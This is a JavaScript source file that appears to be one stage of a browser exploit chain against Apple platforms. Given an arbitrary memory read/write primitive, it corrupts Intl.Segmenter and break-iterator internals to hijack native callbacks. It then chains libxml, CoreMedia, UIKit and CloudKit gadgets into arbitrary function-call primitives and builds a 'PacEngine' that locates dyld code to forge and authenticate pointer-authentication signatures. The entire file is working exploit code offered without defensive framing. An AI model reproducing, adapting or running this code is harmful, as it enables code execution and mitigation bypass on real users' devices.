export function createSeedbellCore({ reader, context: seedbellContext, targets, offsets }) {
const toBigInt = BigInt;
const stripPointerTag = (value) => value & 0x7fffffffffn;

function memory() {
    return reader;
}

function writeLayouts(layouts) {
    for (const [base, fields] of layouts) {
        for (let [offset, value] of fields) {
            if (value == null) value = 0n;
            memory().write64(toBigInt(base) + toBigInt(offset), toBigInt(value));
        }
    }
}

class SegmenterCallbackTrigger {
    constructor() {
        const segmenter = new Intl.Segmenter("en", { Pa: "sentence" });
        const words = [];
        for (let index = 0; index < 300; index++) words.push("a");
        const text = words.join(" ");
        segmenter.segment(text);

        this.segmenter = segmenter;
        this.segments = segmenter.segment(text);
        this.generatedCode = memory().allocZeroBuffer(offsets.generatedCodeSize);
    }

    call(target, argument) {
        const reader = memory();
        const iterator = this.segments[Symbol.iterator]();
        const iteratorAddress = reader.getObjectAddress(iterator);
        const backing = reader.read64(iteratorAddress + toBigInt(offsets.iteratorBacking));
        const stateAddress = backing + toBigInt(offsets.segmenterState);
        const breakIterator = reader.read64(backing + toBigInt(offsets.breakIterator));
        const nativeSegmenter = reader.read64(backing + toBigInt(offsets.nativeSegmenter));
        const textStorage = reader.read64(backing + toBigInt(offsets.textStorage));
        const originalGeneratedCode = reader.read64(stateAddress + toBigInt(offsets.generatedCodePointer));
        const table = reader.read64(breakIterator + toBigInt(offsets.breakIteratorTable));
        const originalBacking = reader.read64(backing + toBigInt(offsets.backingScratchSlot));

        const count = reader.read32(table + toBigInt(offsets.tableCount));
        const stride = reader.read32(table + toBigInt(offsets.tableStride));
        const clonedEntrySize = 2 * (offsets.tableEntryHeaderSize + reader.read32(table + toBigInt(stride)));
        const clonedSize = offsets.tableHeaderSize + clonedEntrySize * count;
        if (clonedSize % 4 !== 0) throw new Error("Segmenter table size is not word aligned");

        const [, clonedTable] = reader.allocZeroBufferPair(clonedEntrySize);
        for (let offset = 0; offset < clonedSize; offset += 4) {
            reader.write32(clonedTable + toBigInt(offset), reader.read32(table + toBigInt(offset)));
        }

        reader.write32(clonedTable + toBigInt(offsets.tableFlags), 6);
        for (let index = 0; index < count; index++) {
            const entry = clonedTable + toBigInt(offsets.tableEntries + stride * index);
            reader.write32(entry, 2);
            for (let byte = 0; byte < stride; byte++) {
                reader.patchByte(entry + toBigInt(offsets.entryBytes + byte), 0);
            }
        }

        const [, scratch] = reader.allocZeroBufferPair(192);
        reader.write32(clonedTable + toBigInt(offsets.tableMetadata), 48);
        const textPatch = textStorage + toBigInt(offsets.textPatch);
        for (let index = 0; index < 128; index++) {
            reader.write32(textPatch + toBigInt(4 * index), 160);
        }

        reader.write64(breakIterator + toBigInt(offsets.breakIteratorTable), clonedTable);
        reader.write64(backing + toBigInt(offsets.backingScratchSlot), scratch);
        reader.write32(nativeSegmenter + toBigInt(offsets.nativeSegmenterLimit), 0xffffffff);
        reader.write32(stateAddress + toBigInt(offsets.stateLength), 160);
        for (let offset = 0; offset < offsets.generatedCodeSize; offset += 4) {
            reader.write32(this.generatedCode + toBigInt(offset), reader.read32(originalGeneratedCode) + offset);
        }
        reader.write64(stateAddress + toBigInt(offsets.generatedCodePointer), this.generatedCode);

        try {
            reader.write64(this.generatedCode + toBigInt(offsets.generatedCodeCallback), target);
            reader.write64(stateAddress + toBigInt(offsets.callbackArgument), argument);
            return iterator.next().value;
        } finally {
            reader.write64(stateAddress + toBigInt(offsets.generatedCodePointer), originalGeneratedCode);
            reader.write64(backing + toBigInt(offsets.backingScratchSlot), originalBacking);
        }
    }
}

class CallbackCallPrimitive {
    constructor() {
        this.targets = {
            xmlSaxPublicIdPointer: targets.xmlSaxPublicIdPointer,
            resyncAllocatePayloadPointer: targets.resyncAllocatePayloadPointer,
            resyncGlobalSlotA: targets.resyncGlobalSlotA,
            resyncGlobalSlotB: targets.resyncGlobalSlotB,
            httpFinalizePointer: targets.httpFinalizePointer,
            autohinterBeginPointer: targets.autohinterBeginPointer,
            autohinterEndPointer: targets.autohinterEndPointer
        };
        this.arguments = memory().allocZeroBuffer(80);
        this.unused = memory().allocZeroBuffer(80);
        this.callbackRecord = memory().allocZeroBuffer(80);
        this.opaqueState = memory().allocZeroBuffer(768);
        this.result = memory().allocZeroBuffer(80);
        this.trigger = new SegmenterCallbackTrigger();
    }

    call({ functionPointer, argument0, argument1 = 0n, argument2 = 0n }) {
        writeLayouts([
            [this.callbackRecord, [
                [32, this.targets.resyncAllocatePayloadPointer],
                [8, this.result],
                [48, this.opaqueState]
            ]],
            [this.result, [[16, 7444609979n]]],
            [this.opaqueState, [
                [64, 0], [24, 0], [120, 0], [296, 0], [304, 0], [312, 0],
                [344, 0], [376, this.targets.autohinterBeginPointer], [136, 0],
                [384, argument1], [392, this.arguments], [400, 483183820]
            ]],
            [this.arguments, [
                [16, functionPointer], [8, argument0], [48, argument2]
            ]]
        ]);

        const originalA = memory().read64(this.targets.resyncGlobalSlotA);
        const originalB = memory().read64(this.targets.resyncGlobalSlotB);
        try {
            memory().write64(this.targets.resyncGlobalSlotA, this.targets.httpFinalizePointer);
            memory().write64(this.targets.resyncGlobalSlotB, this.targets.xmlSaxPublicIdPointer);
            this.trigger.call(this.targets.autohinterEndPointer, this.callbackRecord);
        } finally {
            memory().write64(this.targets.resyncGlobalSlotA, originalA);
            memory().write64(this.targets.resyncGlobalSlotB, originalB);
        }
        return memory().read64(this.result + 0x10n);
    }
}

class XmlAllocator {
    constructor() {
        this.xmlMallocFunction = targets.xmlMallocFunction;
        this.callbackCall = new CallbackCallPrimitive();
    }

    allocate(size) {
        return this.callbackCall.call({
            functionPointer: this.xmlMallocFunction,
            argument0: size
        });
    }
}

class SelectorDispatchPrimitive {
    constructor() {
        this.targets = {
            xmlSaxPublicIdPointer: targets.xmlSaxPublicIdPointer,
            resyncAllocatePayloadPointer: targets.resyncAllocatePayloadPointer,
            resyncGlobalSlotA: targets.resyncGlobalSlotA,
            resyncGlobalSlotB: targets.resyncGlobalSlotB,
            httpFinalizePointer: targets.httpFinalizePointer,
            coreMediaReleasePointer: targets.coreMediaReleasePointer,
            autohinterEndPointer: targets.autohinterEndPointer
        };
        this.callbackRecord = memory().allocZeroBuffer(80);
        this.opaqueState = memory().allocZeroBuffer(544);
        this.result = memory().allocZeroBuffer(80);
        this.methodObject = null;
        this.methodStorage = memory().allocZeroBuffer(80);
        this.allocator = new XmlAllocator();
        this.trigger = new SegmenterCallbackTrigger();
    }

    call({ functionPointer, object, outputAddress, outputContext }) {
        this.methodObject = this.allocator.allocate(0x120n);
        writeLayouts([
            [this.callbackRecord, [
                [32, this.targets.httpFinalizePointer],
                [8, this.opaqueState],
                [48, 0]
            ]],
            [this.opaqueState, [
                [64, 0], [24, 0], [120, 0], [296, 0], [304, 0], [312, 0],
                [344, 0], [376, this.targets.coreMediaReleasePointer], [136, 0],
                [384, this.methodObject], [392, outputAddress], [400, outputContext]
            ]],
            [this.methodObject, [[0, object], [8, this.methodStorage]]],
            [this.methodStorage, [[0, this.result], [16, this.targets.resyncAllocatePayloadPointer]]],
            [this.result, [[16, 0x0bbb9999n]]]
        ]);

        const originalA = memory().read64(this.targets.resyncGlobalSlotA);
        const originalB = memory().read64(this.targets.resyncGlobalSlotB);
        try {
            memory().write64(this.targets.resyncGlobalSlotA, functionPointer);
            memory().write64(this.targets.resyncGlobalSlotB, this.targets.xmlSaxPublicIdPointer);
            this.trigger.call(this.targets.autohinterEndPointer, this.callbackRecord);
        } finally {
            memory().write64(this.targets.resyncGlobalSlotA, originalA);
            memory().write64(this.targets.resyncGlobalSlotB, originalB);
        }
        return memory().read64(this.result + 0x10n);
    }
}

class SelectorInvoker {
    constructor() {
        this.functionPointer = targets.uiKitSecondAttributeFunction;
        this.selectorSlot = targets.uiKitSecondAttributeSlot;
        this.dispatch = new SelectorDispatchPrimitive();
    }

    call({ object, selector, outputAddress, outputContext }) {
        const originalSelector = memory().read64(this.selectorSlot);
        try {
            memory().write64(this.selectorSlot, selector);
            return this.dispatch.call({
                functionPointer: this.functionPointer,
                object,
                outputAddress,
                outputContext
            });
        } finally {
            memory().write64(this.selectorSlot, originalSelector);
        }
    }
}

class ObjectMethodResolver {
    constructor() {
        this.targets = {
            nsuuidClass: targets.nsuuidClass,
            uuidSelector: targets.uuidSelector,
            cloudKitGlobalSlot: targets.cloudKitGlobalSlot,
            cloudKitBindingSelector: targets.cloudKitBindingSelector
        };
        this.cachedObject = null;
        this.result = memory().allocZeroBuffer(32);
        this.selectorInvoker = new SelectorInvoker();
    }

    resolve(functionPointer) {
        if (this.cachedObject === null) {
            this.cachedObject = this.selectorInvoker.call({
                object: this.targets.nsuuidClass,
                selector: this.targets.uuidSelector
            });
        }

        const originalGlobal = memory().read64(this.targets.cloudKitGlobalSlot);
        try {
            memory().write64(this.targets.cloudKitGlobalSlot, functionPointer);
            this.selectorInvoker.call({
                object: this.cachedObject,
                selector: this.targets.cloudKitBindingSelector,
                outputAddress: this.result + 0x10n,
                outputContext: this.result
            });
        } finally {
            memory().write64(this.targets.cloudKitGlobalSlot, originalGlobal);
        }
        return memory().read64(this.result);
    }
}

class SignedCallbackCall {
    constructor() {
        this.xmlHashScanFull = targets.xmlHashScanFull;
        this.cachedSignedCallback = null;
        this.outer = memory().allocZeroBuffer(32);
        this.inner = memory().allocZeroBuffer(48);
        this.callbackCall = new CallbackCallPrimitive();
        this.objectResolver = new ObjectMethodResolver();
    }

    call({ functionPointer, argument0, argument1, argument2, argument3, selector }) {
        if (argument0 === 0 || argument0 === 0n) {
            throw new Error("Native call argument is null");
        }
        if (this.cachedSignedCallback === null) {
            this.cachedSignedCallback = this.objectResolver.resolve(this.xmlHashScanFull);
        }

        writeLayouts([
            [this.outer, [[0, this.inner], [8, 1], [12, 1]]],
            [this.inner, [
                [0, 0], [8, argument2], [16, argument3], [24, selector],
                [32, argument0], [40, 1]
            ]]
        ]);

        return this.callbackCall.call({
            functionPointer: this.cachedSignedCallback,
            argument0: this.outer,
            argument1: functionPointer,
            argument2: argument1
        });
    }
}

class PacEngine {
    constructor() {
        const context = seedbellContext;
        this.dispatcher = targets.pacDispatcher;
        this.cachedDispatcher = null;
        this.callPrimitive = new SignedCallbackCall();
        this.objectResolver = new ObjectMethodResolver();

        let table = context.scanner.findPattern(targets.dyldImage, [
            2852127729, 2852652016, 3573752095, 335544332,
            2852127729, 2852652016, 3670084113, 335544328,
            2852127729, 2852652016, 3573752159, 335544324,
            2852127729, 2852652016, 3670085137, 2853241824, 3596551104
        ]);
        while (table === this.dispatcher) {
            table = context.scanner.findPattern(
                targets.dyldImage,
                [
                    2852127729, 2852652016, 3573752095, 335544332,
                    2852127729, 2852652016, 3670084113, 335544328,
                    2852127729, 2852652016, 3573752159, 335544324,
                    2852127729, 2852652016, 3670085137, 2853241824, 3596551104
                ],
                table + 68n
            );
        }
        if (table === null) throw new Error("dyld PAC operation table was not found");

        this.pacdaAddress = table;
        this.autiaAddress = table + 0x10n;
        this.paciaAddress = table + 0x20n;
        this.autdaAddress = table + 0x30n;
    }

    invoke(operation, value, context) {
        if (this.cachedDispatcher === null) {
            this.cachedDispatcher = this.objectResolver.resolve(this.dispatcher);
        }
        return this.callPrimitive.call({
            functionPointer: this.cachedDispatcher,
            argument0: value,
            argument1: context & 0xffffffffffffn,
            argument2: 1n,
            argument3: (context >> 48n) & 0xffffn,
            selector: toBigInt(operation)
        });
    }

    pacda(value, context) { return this.invoke(0, value, context); }
    pacia(value, context) { return this.invoke(1, value, context); }
    autia(value, context) { return this.invoke(2, value, context); }
    autda(value, context) { return this.invoke(3, value, context); }
}

return { PacEngine, SignedCallbackCall };
}
